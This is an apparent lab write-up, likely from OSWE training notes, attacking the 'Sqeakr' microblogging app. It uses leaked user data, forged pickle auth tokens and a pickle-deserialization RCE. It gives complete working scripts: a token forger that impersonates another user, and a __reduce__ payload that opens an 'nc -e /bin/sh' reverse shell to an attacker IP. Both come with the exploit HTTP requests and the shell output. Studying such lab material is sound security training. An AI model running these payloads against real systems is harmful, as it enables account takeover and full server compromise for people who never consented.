# Sqeakr Application Python Deserialization Attacks — Blackbox 
**Sqeakr** is an *invite-only microblogging platform designed to help you connect with friends worldwide.* With an invitation code, you can create an account, log in, and begin using the app to create and share posts, save drafts for later, and interact with content from other users.
## Authentication Bypass — Python's `pickle` Insecure Deserialization
### Vulnerability Discovery
Since we do not have an invitation code to create an account and access the target application as an authenticated user, our testing focused on unauthenticated interactions.

#### Leaked User Account Information
While exploring publicly accessible routes, we identified the endpoint **`/api/sqeaks`**, which exposes sensitive details about existing user accounts. The response JSON body reveals information such as `email`, `userid`, and `username`:

```json
[
  {
    "owner": {
      "email": "test@test.com",
      "username": "sleestak",
      "userid": "b1c7f094-cbd4-44a0-91c3-e23dcb8962f1",
      "..."
    },
    "likes": [
      "...",
      {
        "username": "walter",
        "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d",
        "..."
      }
    ],
    "..."
  }
]
```
We will take notes of the leaked information and move-on to continue our discovery phase.

#### Insecure Use of Python `pickle` for Authentication
When attempting to log in to the target application using the leaked email address `test@test.com`:

```
POST /api/login HTTP/1.1
Host: 192.168.174.248
Content-Length: 50

{"username":"test@test.com","password":"anything"}
```

The server responded with an authentication failure, but the JSON body included a suspicious `authtoken` value:

```
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.2
Date: Fri, 05 Sep 2025 13:28:57 GMT
Content-Type: application/json
Content-Length: 183
...

{"status": "error", "message": "Invalid username or password", "authtoken": "gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADAwMDAwMDAwLTAwMDAtNDAwMC04MDAwLTAwMDAwMDAwMDAwMHEDdS4="}
```

Decoding the base64-encoded `authtoken` revealed binary data consistent with **Python `pickle` serialization**:

```bash
┌──(kali㉿kali)-[~]
└─$ echo "gAN9cQAoWAQAAABhdXRocQFLAFgGAAAAdXNlcmlkcQJYJAAAADAwMDAwMDAwLTAwMDAtNDAwMC04MDAwLTAwMDAwMDAwMDAwMHEDdS4=" | base64 -d | xxd
00000000: 8003 7d71 0028 5804 0000 0061 7574 6871  ..}q.(X....authq
00000010: 014b 0058 0600 0000 7573 6572 6964 7102  .K.X....useridq.
00000020: 5824 0000 0030 3030 3030 3030 302d 3030  X$...00000000-00
00000030: 3030 2d34 3030 302d 3830 3030 2d30 3030  00-4000-8000-000
00000040: 3030 3030 3030 3030 3071 0375 2e         000000000q.u.
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 
```

Key observations:

* The first byte `0x80` indicates the **pickle protocol magic number**.
* The next byte `0x03` specifies **protocol version 3** (Python 3.x).
* The remaining opcodes (`}q`, `X`, `K`, `u`, `.`) are standard **pickle instructions** for constructing Python objects.

Decoding this data structure reveals that the token is simply a pickled Python dictionary:

```python
{
    "auth": 0,
    "userid": "00000000-0000-4000-8000-000000000000"
}
```

This confirms that the application’s backend is a Python service using **pickle-based serialization for authentication tokens**, a practice known to be insecure because `pickle` can execute arbitrary objects when deserialized.

⚠️ One important note: `pickle` is unsafe to deserialize from untrusted sources, since it can execute arbitrary code. That means if you see this in the wild, it’s a strong indicator of a Python backend with potential security implications.

### Serialization Magic Bytes Reference 
##### 🐍 Python serialization formats

| Library / Format    | Magic Bytes (hex)                            | Base64 (magic bytes only)                                              | Notes                                                   |
| ------------------- | -------------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------- |
| **pickle**          | `80 02` (protocol 2), `80 03`, `80 04`, `80 05` | `gAI=` (protocol 2), `gAM=` (proto 3), `gAQ=` (proto 4), `gAU=` (proto 5) | Always starts with `0x80` followed by protocol version. |
| **marshal**         | Example: `e3 00 00 00` (Python 3.10)         | `4wAAA`                                                                | Version-dependent; not stable across Python versions.   |
| **jsonpickle**      | `{` (`7B`) / `[` (`5B`)                      | `ew==` / `Ww==`                                                        | JSON serialization.                                     |
| **PyYAML / ruamel** | `2D 2D 2D` ("---")                           | `LS0t`                                                                 | Optional header; otherwise plain text.                  |


##### ☕ Java serialization formats

| Library / Format                                     | Magic Bytes (hex)       | Base64 (magic bytes only) | Notes                                           |
| ---------------------------------------------------- | ----------------------- | ------------------------- | ----------------------------------------------- |
| **Java native serialization (`ObjectOutputStream`)** | `AC ED 00 05`           | `rO0ABQ==`                | Standard magic for all Java-serialized objects. |
| **JSON (Jackson, Gson, etc.)**                       | `{` (`7B`) / `[` (`5B`) | `ew==` / `Ww==`           | Plain JSON.                                     |
| **YAML (SnakeYAML)**                                 | `2D 2D 2D` ("---")      | `LS0t`                    | Optional marker, otherwise text.                |
| **XML (XStream, JAXB)**                              | `<` (`3C`)              | `PA==`                    | XML-based serialization.                        |


##### 💻 .NET serialization formats

| Library / Format                  | Magic Bytes (hex)       | Base64 (magic bytes only) | Notes                                                 |
| --------------------------------- | ----------------------- | ------------------------- | ----------------------------------------------------- |
| **BinaryFormatter**               | `00 01 00 00`           | `AAEAAA==`                | Stream header, often followed by record type markers. |
| **LosFormatter**                  | `FF 01 00 00`           | `/wEAAA==`                | ASP.NET-specific serialization.                       |
| **SOAP / DataContractSerializer** | `<` (`3C`)              | `PA==`                    | XML.                                                  |
| **JSON.NET / System.Text.Json**   | `{` (`7B`) / `[` (`5B`) | `ew==` / `Ww==`           | JSON text.                                            |


##### 🐘 PHP serialization formats

| Library / Format  | Magic Bytes (ASCII)                                            | Base64 (magic bytes only)      | Notes                                          |
| ----------------- | -------------------------------------------------------------- | ------------------------------ | ---------------------------------------------- |
| **serialize()**   | `a:` (`61 3A`), `O:` (`4F 3A`), `s:` (`73 3A`), `i:` (`69 3A`) | `YTo=`, `Tzo=`, `czo=`, `aTo=` | First byte indicates type.                     |
| **igbinary**      | `00 00 00 02`                                                  | `AAAAAg==`                     | Magic + version (differs by igbinary version). |
| **msgpack (ext)** | Binary, no fixed magic                                         | N/A                            | Not fingerprintable by magic bytes alone.      |


##### 🌐 JSON (cross-language)

| Format   | Magic Bytes (ASCII)      | Base64 (magic bytes only) | Notes                                          |
| -------- | ------------------------ | ------------------------- | ---------------------------------------------- |
| **JSON** | `{` (`7B`) or `[` (`5B`) | `ew==` / `Ww==`           | Universal across Python, Java, .NET, PHP, etc. |


### Authentication Bypass — Python `pickle` Insecure Deserialization Exploitation 
An attacker can use a Python script to generate a Python `pickle` serialized object and use it to authenticate to the application:
```python
import pickle
import base64

# JSON object - existing account details 
json_acc_details = {
    "auth": 1, # change status to `1` instead of `0` 
    "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d" # walter's user ID returned from `/api/sqeaks`
}

# Serialize walter's account details to pickle (protocol 3 for compatibility with Python 3.x)
acc_details_pickled = pickle.dumps(json_acc_details, protocol=3)

# Base64 encode the acc_details_pickled data
acc_details_pickled_b64_encoded = base64.b64encode(acc_details_pickled).decode("utf-8")

print(acc_details_pickled_b64_encoded)
```
Output:
```bash
┌──(kali㉿kali)-[~]
└─$ /usr/bin/python authTokenGen.py
gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ 
```
#### Authenticate to the Target Application 
Now we have a valid authentication token, we need to find out how to use it to authenticate ourselves to the target application.

Searching with the word `authtoken` in the target's JavaScript files, we reach:
```javascript
...
actions: {
  login: function (t, e) {
    var a = t.commit;
    return new Promise(function (t, n) {
      a("auth_request");
      A(e.username, e.password)
        .then(function (e) {
          var n = e.authtoken, // extract the auth token from response
              s = e.username;  // extract the username from response
          localStorage.setItem("token", n); // persist token in localStorage
          P.a.defaults.headers.common["authtoken"] = n; // attach token to default headers for all requests
          a("auth_success", { token: n, username: s }); // update Vuex store
          t(e); // resolve the promise with response
        })
        .catch(function (t) {
          n(t); // reject promise on error
        });
    });
  }
}
...
```
- Upon the authentication happens (The **user provides** `username` and `password`).
- The frontend calls an **authentication API** (`A()`).
- The backend **returns an `authtoken`** if the credentials are valid.
- The frontend then:

  1. Saves it to `localStorage` (for persistence between refreshes).
  2. Adds it to the **default headers** of Axios (so every API request includes the token).
  3. Updates the Vuex state with the token and username.

Now we know how to authenticate to the target application, so let's put the authentication token we generated earlier in our browser's local storage in a parameter called `token` so the browser can reused it for subsequent requests.

Let's try to request `/api/profile` to verify that we are authenticated:
```
GET /api/profile HTTP/1.1
Host: 192.168.174.248
authtoken: gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=
Cookie: authtoken=gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=

```

Response body:
```json
{"id": 8, "username": "walter", "firstname": "Walter", "lastname": "", "bio": "Sehen Sie diese Stadt? Das ist Walter!", "email": "test@test.com", "location": "Sarajevo", "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d", "avatar": "walter/514ca1b412437e8a4a3ae853610686bc.jpg"}
```

**Authentication Bypass Script:** [pickle_insecure_deserialization_auth_bypass.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Sqeakr%20Application/pickle_insecure_deserialization_auth_bypass.py) 

## Remote Code Execution (RCE) — Python's `pickle` Insecure Deserialization
### Vulnerability Discovery — `draft` Cookie
After logging in to the target application, now we have a larget attack surface to search for RCE.

Exploring the application as an authenticated user, we came across a function that is responsible to saving posts as a draft:
```
POST /api/draft HTTP/1.1
Host: 192.168.174.248
authtoken: gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=
Content-Type: application/json;charset=utf-8
Cookie: authtoken=gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=
Content-Length: 26

{"sqeak":"This is draft."}
```

And the server responds with:
```
HTTP/1.1 201 Created
Server: nginx/1.14.2
Date: Fri, 05 Sep 2025 15:31:39 GMT
Content-Type: application/json
Content-Length: 50
...
Set-Cookie: draft="gAN9cQBYBQAAAGRyYWZ0cQFYDgAAAFRoaXMgaXMgZHJhZnQucQJzLg=="; HttpOnly; Path=/



{"status": "ok", "message": "Draft sqeak created"}
```
The server responded with a base64 encoded value in a cookie parameter called `draft`, decoding the value again, and following its HEX representstion, we found out that it is a Python `pickle` serialized object again:
```bash
┌──(kali㉿kali)-[~]
└─$ echo "gAN9cQBYBQAAAGRyYWZ0cQFYDgAAAFRoaXMgaXMgZHJhZnQucQJzLg==" | base64 -d | xxd                                                
00000000: 8003 7d71 0058 0500 0000 6472 6166 7471  ..}q.X....draftq
00000010: 0158 0e00 0000 5468 6973 2069 7320 6472  .X....This is dr
00000020: 6166 742e 7102 732e                      aft.q.s.
                                                                                                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 
```
Now, remember the note we observed obove?
```
⚠️ One important note: `pickle` is unsafe to deserialize from untrusted sources, since it can execute arbitrary code. That means if you see this in the wild, it’s a strong indicator of a Python backend with potential security implications.
```

### Payload Generation 
Using the fact that we can pass a malicious serialized object to the target application (as a value of the cookie parameter `draft`) and use it to execute arbitrary code, let's use a method `subprocess.Popen` to execute system level commands:
```python
import pickle
import base64
import subprocess

class Gen(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return subprocess.Popen, (self.payload,)

# Payload is a tuple 
reverse_shell_payload = ("nc", "-e", "/bin/sh", "192.168.45.198", "1337") # change the IP and port 

# Pickle with protocol=4
reverse_shell_payload_pickled = pickle.dumps(Gen(reverse_shell_payload), protocol=4)

# Base64 encode
reverse_shell_payload_pickled_base64_encoded = base64.b64encode(reverse_shell_payload_pickled).decode()
print(reverse_shell_payload_pickled_base64_encoded)
```

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ /usr/bin/python revshell.py
gASVSwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMAm5jlIwCLWWUjAcvYmluL3NolIwOMTkyLjE2OC40NS4xOTiUjAQxMzM3lHSUhZRSlC4=
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ 
```

Another way to generate the serialized object is using the Peas tool as a Python deserialization attack payload generator: https://github.com/j0lt-github/python-deserialization-attack-payload-generator 

### Remote Code Execution — Python `pickle` Insecure Deserialization of the `draft` Cookie Parameter 
With our payload generated, we need to trigger the vulnerability by requesting the endpoint `/api/draft` with our `draft` cookie parameter set to the malicious serialized object:
```
GET /api/draft HTTP/1.1
Host: 192.168.174.248
authtoken: gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=
Cookie: authtoken=gAN9cQAoWAQAAABhdXRocQFLAVgGAAAAdXNlcmlkcQJYJAAAADkwNWI0Mjk2LWU1OTEtNGI4MS04YWQ2LWI5YWJmOTBiZjA3ZHEDdS4=; draft=gASVSwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMAm5jlIwCLWWUjAcvYmluL3NolIwOMTkyLjE2OC40NS4xOTiUjAQxMzM3lHSUhZRSlC4=


```
Then check our listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.174.248] 46052
id
uid=1000(student) gid=33(www-data) groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

**Reverse Shell Script:** [pickle_insecure_des_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Sqeakr%20Application/pickle_insecure_des_rce.py) 


## Refrences:
- Python deserialization attack payload generator: https://github.com/j0lt-github/python-deserialization-attack-payload-generator 
- Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles): https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/
